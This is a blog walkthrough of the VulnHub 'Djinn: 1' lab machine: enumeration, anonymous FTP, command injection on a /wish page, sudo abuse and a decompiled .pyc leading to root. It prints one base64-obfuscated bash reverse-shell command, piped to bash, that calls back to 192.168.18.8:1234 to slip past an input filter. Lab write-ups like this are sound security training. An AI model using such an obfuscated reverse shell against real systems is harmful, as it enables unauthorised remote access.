<!-- wp:paragraph -->
<p><a href="https://www.vulnhub.com/entry/djinn-1,397/" target="_blank" rel="noreferrer noopener">https://www.vulnhub.com/entry/djinn-1,397/</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-purple","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-purple-background-color has-background has-small-font-size">Review</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Enumeration will lead to several open ports</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>FTP can be access anonymously and clues will be inside</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A game server cant be connected on a browser but able to be connected through netcat</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Gobuster enumeration shows hidden directories</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Able to use LFI for command injection , however there are character restrictions</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use base64 to bypass character restrictions</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Check for creds in the directories in the user</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Check for sudo permissions to gain user access</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Decompile a python file to find the answer for root access</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"luminous-vivid-amber","fontSize":"small"} -->
<p class="has-text-align-center has-luminous-vivid-amber-background-color has-background has-small-font-size"><strong>Enumeration</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Run nmap scan to find for open ports.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5130,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-469.png?w=709" alt="" class="wp-image-5130"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5132,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-470.png?w=876" alt="" class="wp-image-5132"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5134,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-471.png?w=1024" alt="" class="wp-image-5134"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>FTP Enumeration</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5136,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-472.png?w=924" alt="" class="wp-image-5136"/><figcaption class="wp-element-caption">Get the files in the FTP server</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5138,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-473.png?w=1008" alt="" class="wp-image-5138"/><figcaption class="wp-element-caption">Found some clues</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's try connecting to the game server.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5154,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-482.png?w=1024" alt="" class="wp-image-5154"/><figcaption class="wp-element-caption">unable to connect</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's use netcat to connect.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5156,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-483.png?w=691" alt="" class="wp-image-5156"/><figcaption class="wp-element-caption">Found the game server but we need to answer 1000 questions.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Port 7331 Http</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5140,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-474.png?w=1024" alt="" class="wp-image-5140"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Run a gobuster scan to find for hidden directories. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5145,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-477.png?w=1024" alt="" class="wp-image-5145"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/genie is just an error page</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5143,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-476.png?w=1024" alt="" class="wp-image-5143"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/wish</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5141,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-475.png?w=624" alt="" class="wp-image-5141"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We are able to input cmd and view the info in the source page.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5152,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-481.png?w=501" alt="" class="wp-image-5152"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5149,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-479.png?w=1024" alt="" class="wp-image-5149"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5150,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-480.png?w=700" alt="" class="wp-image-5150"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Insert a bash shell but it shows an error shown below.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5187,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-492.png?w=1024" alt="" class="wp-image-5187"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>It seems there is some kind of input validation. Let's encode the script.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Use base64 to encode the bash reverse shell.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5189,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-493.png?w=655" alt="" class="wp-image-5189"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Start a netcat listener and add the encoded script with grep to decode in the /wish directory.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE4LjgvMTIzNCAwPiYxCg== | base64 -d | bash</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-cyan-blue","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-cyan-blue-background-color has-background has-small-font-size"><strong>Foothold</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Access gained.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5191,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-494.png?w=1024" alt="" class="wp-image-5191"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>In the /opt/80 directory we find an interesting python program. Cat the program and we can find a directory that has some creds.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5196,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-496.png?w=1014" alt="" class="wp-image-5196"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We are able to read the cred.txt file and find a password for a user.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5197,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-497.png?w=812" alt="" class="wp-image-5197"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Head the user directory to find the first flag.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5199,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-498.png?w=588" alt="" class="wp-image-5199"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Check sudo permissions </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5201,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-499.png?w=1024" alt="" class="wp-image-5201"/><figcaption class="wp-element-caption">Only the sam user allowed to run the sudo genie command.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's check out the genie command.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5203,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-500.png?w=1024" alt="" class="wp-image-5203"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Input the following to get the sam user.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5205,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-501.png?w=549" alt="" class="wp-image-5205"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph {"align":"center","backgroundColor":"black","textColor":"white","fontSize":"small"} -->
<p class="has-text-align-center has-white-color has-black-background-color has-text-color has-background has-small-font-size"><strong>Privilege escalation</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Check for sudo permissions.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5207,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-502.png?w=1024" alt="" class="wp-image-5207"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's check out the lago program</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5208,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-503.png?w=657" alt="" class="wp-image-5208"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5209,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-504.png?w=838" alt="" class="wp-image-5209"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>in the same user we are able to find a hidden file call .pyc</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5225,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-513.png?w=1010" alt="" class="wp-image-5225"/><figcaption class="wp-element-caption">The file is compiled and we aren't able to get much info.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Transfer the file to your attacking machine and decompile the file.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5218,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-508.png?w=655" alt="" class="wp-image-5218"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5219,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-509.png?w=622" alt="" class="wp-image-5219"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I was unable to use <strong>uncompyle6</strong>  as it does not support python 3.10 and above. Dow load pycdc to decompile the file if you are using python 3.10 and above.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5223,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-512.png?w=439" alt="" class="wp-image-5223"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Run the program and we can see that if we input num in the 2nd option of the program we will get a root shell.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5222,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-511.png?w=574" alt="" class="wp-image-5222"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5211,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-505.png?w=573" alt="" class="wp-image-5211"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Found the proof.sh flag in the root folder.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5213,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-506.png?w=1024" alt="" class="wp-image-5213"/></figure>
<!-- /wp:image -->
